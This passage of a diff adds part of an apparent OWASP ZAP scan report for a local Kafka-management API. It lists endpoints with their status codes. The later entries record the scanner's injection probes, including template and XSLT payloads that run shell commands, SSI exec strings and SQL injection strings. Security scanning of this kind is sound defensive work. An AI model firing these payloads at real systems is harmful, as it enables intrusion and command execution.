+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8714",
+							"uri": "http://host.docker.internal:8000/api/versions/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "168",
+							"uri": "http://host.docker.internal:8000/api/versions/8907070416592290171",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/8907070416592290171",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "32",
+							"uri": "http://host.docker.internal:8000/api/versions/connect-plugins",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/connect-plugins",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8720",
+							"uri": "http://host.docker.internal:8000/api/versions/connect-plugins/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/connect-plugins\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "29",
+							"uri": "http://host.docker.internal:8000/api/versions/kafka",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/kafka",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8719",
+							"uri": "http://host.docker.internal:8000/api/versions/kafka/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/kafka\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "169",
+							"uri": "http://host.docker.internal:8000/api/versions/kafka/4004673124987054420",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/kafka\/4004673124987054420",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "30",
+							"uri": "http://host.docker.internal:8000/api/versions/kafka/version",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/kafka\/version",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8716",
+							"uri": "http://host.docker.internal:8000/api/versions/kafka/version/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/kafka\/version\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "0",
+							"uri": "http://host.docker.internal:8000/api/auth/login",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/login ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8406",
+							"uri": "http://host.docker.internal:8000/api/auth/login/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/login\/ ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "2",
+							"uri": "http://host.docker.internal:8000/api/auth/refresh",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/refresh ()({refresh_token})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8410",
+							"uri": "http://host.docker.internal:8000/api/auth/refresh/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/refresh\/ ()({refresh_token})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "5",
+							"uri": "http://host.docker.internal:8000/api/auth/users",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users ()({\"username\":\"John Doe\",\"password\":ZAP,\"role\":\"monitor\"})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8405",
+							"uri": "http://host.docker.internal:8000/api/auth/users/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users\/ ()({\"username\":\"John Doe\",\"password\":ZAP,\"role\":\"monitor\"})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "81",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit/audit_id/rollback",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit\/audit_id\/rollback",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8422",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit/audit_id/rollback/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit\/audit_id\/rollback\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "101",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links ()({\"name\":ZAP,\"source_cluster_id\":\"John Doe\",\"destination_cluster_id\":\"John Doe\",\"topics_pattern\":\".*\",\"sync_consumer_offsets\":true,\"sync_topic_configs\":true})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8447",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/ ()({\"name\":ZAP,\"source_cluster_id\":\"John Doe\",\"destination_cluster_id\":\"John Doe\",\"topics_pattern\":\".*\",\"sync_consumer_offsets\":true,\"sync_topic_configs\":true})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "105",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/deploy",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/deploy",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8419",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/deploy/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/deploy\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "107",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/start",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/start",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8425",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/start/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/start\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "108",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/stop",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/stop",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8449",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/stop/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/stop\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "16",
+							"uri": "http://host.docker.internal:8000/api/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters ()({\"name\":ZAP,\"kafka_version\":\"3.7.0\",\"mode\":\"kraft\",\"services\":\"John Doe\",\"config\":{\"replication_factor\":3,\"num_partitions\":3,\"log_dirs\":\"\/var\/lib\/kafka\/data\",\"listener_port\":9092,\"controller_port\":9093,\"heap_size\":\"1G\",\"ksqldb_port\":8088,\"connect_port\":8083,\"connect_rest_port\":8083}})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8457",
+							"uri": "http://host.docker.internal:8000/api/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/ ()({\"name\":ZAP,\"kafka_version\":\"3.7.0\",\"mode\":\"kraft\",\"services\":\"John Doe\",\"config\":{\"replication_factor\":3,\"num_partitions\":3,\"log_dirs\":\"\/var\/lib\/kafka\/data\",\"listener_port\":9092,\"controller_port\":9093,\"heap_size\":\"1G\",\"ksqldb_port\":8088,\"connect_port\":8083,\"connect_rest_port\":8083}})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "43",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors ()({\"name\":ZAP,\"config\":\"John Doe\"})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8453",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ ()({\"name\":ZAP,\"config\":\"John Doe\"})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "49",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/restart",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/restart",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8427",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/restart/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/restart\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "40",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/consume",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/consume ()({topic,from_beginning,max_messages,group_id,timeout_ms})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8438",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/consume/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/consume\/ ()({topic,from_beginning,max_messages,group_id,timeout_ms})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "19",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/deploy",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/deploy",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8443",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/deploy/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/deploy\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "62",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/execute",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/execute ()({sql,timeout})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8433",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/execute/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/execute\/ ()({sql,timeout})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "69",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history ()({\"sql\":\"John Doe\",\"name\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8439",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history\/ ()({\"sql\":\"John Doe\",\"name\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "63",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/start",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/start ()({sql})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8444",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/start/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/start\/ ()({sql})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "65",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/stream_id/stop",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/stream_id\/stop",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8445",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/stream_id/stop/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/stream_id\/stop\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "67",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/terminate/query_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/terminate\/query_id",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8471",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/terminate/query_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/terminate\/query_id\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "39",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/produce",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/produce ()({topic,key,value,headers})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8501",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/produce/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/produce\/ ()({topic,key,value,headers})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "56",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls ()({principal,resource_type,resource_name,pattern_type,operations,permission_type,host})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8484",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/ ()({principal,resource_type,resource_name,pattern_type,operations,permission_type,host})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "52",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users ()({username,password,mechanism})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8486",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/ ()({username,password,mechanism})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "54",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/username/rotate",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/username\/rotate ()({password})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8502",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/username/rotate/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/username\/rotate\/ ()({password})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7500",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"#set($engine=\\\"\\\")\\n#set($proc=$engine.getClass().forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"sleep 15\\\"))\\n#set($null=$proc.waitFor())\\n${null}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7678",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"#{%x(sleep 15)}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7581",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "3925",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "3954",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\\\\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7616",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"${__import__(\\\"subprocess\\\").check_output(\\\"sleep 15\\\", shell=True)}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2079",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2204",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"'(\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "3900",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4033",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"+response.write({0}*{1})+\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1006",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"576128121310197795.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1035",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"5;URL='https:\/\/576128121310197795.owasp.org'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1101",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"5;URL='https:\/\/576128121310197795.owasp.org\/?John Doe'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2160",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\";\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "3973",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6041",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1758",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<!--#EXEC cmd=\\\"dir \\\\\\\"-->\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1726",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<!--#EXEC cmd=\\\"ls \/\\\"-->\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9907",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7462",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"sleep 15\\\") }\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7564",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7637",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<%=%x(sleep 15)%>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9996",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<xsl:value-of select=\\\"document('http:\/\/host.docker.internal:22')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "10052",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<xsl:value-of select=\\\"php:function('exec','erroneous_command 2>\u0026amp;1')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9917",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9980",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/><!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "10027",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"<xsl:variable name=\\\"rtobject\\\" select=\\\"runtime:getRuntime()\\\"\/>\\n<xsl:variable name=\\\"process\\\" select=\\\"runtime:exec($rtobject,'erroneous_command')\\\"\/>\\n<xsl:variable name=\\\"waiting\\\" select=\\\"process:waitFor($process)\\\"\/>\\n<xsl:value-of select=\\\"$process\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2270",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe AND 1=1 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2299",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe AND 1=2 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2330",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe OR 1=1 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2422",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe UNION ALL select NULL -- \")",
